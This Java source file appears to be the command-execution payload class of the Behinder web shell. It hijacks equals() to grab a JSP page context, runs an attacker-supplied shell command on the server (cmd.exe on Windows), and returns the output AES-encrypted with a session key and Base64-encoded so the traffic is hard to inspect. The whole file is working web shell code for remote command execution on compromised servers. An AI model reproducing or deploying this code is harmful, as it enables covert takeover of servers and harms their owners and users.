package net.rebeyond.behinder.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Cmd {
    public static String cmd;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();
        try {
            result.put("msg", RunCMD(cmd));
            result.put("status", "success");
            try {
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e2) {
            result.put("msg", e2.getMessage());
            result.put("status", "success");
            try {
            } catch (Exception e3) {
                e3.printStackTrace();
            }
        } finally {
            try {
                ServletOutputStream so = this.Response.getOutputStream();
                so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                so.flush();
                so.close();
                page.getOut().clear();
            } catch (Exception e4) {
                e4.printStackTrace();
            }
        }
        return true;
    }

    private String RunCMD(String cmd2) throws Exception {
        Process p;
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        String result = "";
        if (cmd2 == null || cmd2.length() <= 0) {
            return result;
        }
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd2});
        } else {
            p = Runtime.getRuntime().exec(cmd2);
        }
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
        String disr = br.readLine();
        String result2 = result;
        while (disr != null) {
            String result3 = result2 + disr + "\n";
            disr = br.readLine();
            result2 = result3;
        }
        return new String(result2.getBytes(osCharset));
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes(StandardCharsets.UTF_8)});
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder2, new Object[]{value.getBytes(StandardCharsets.UTF_8)})).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
}
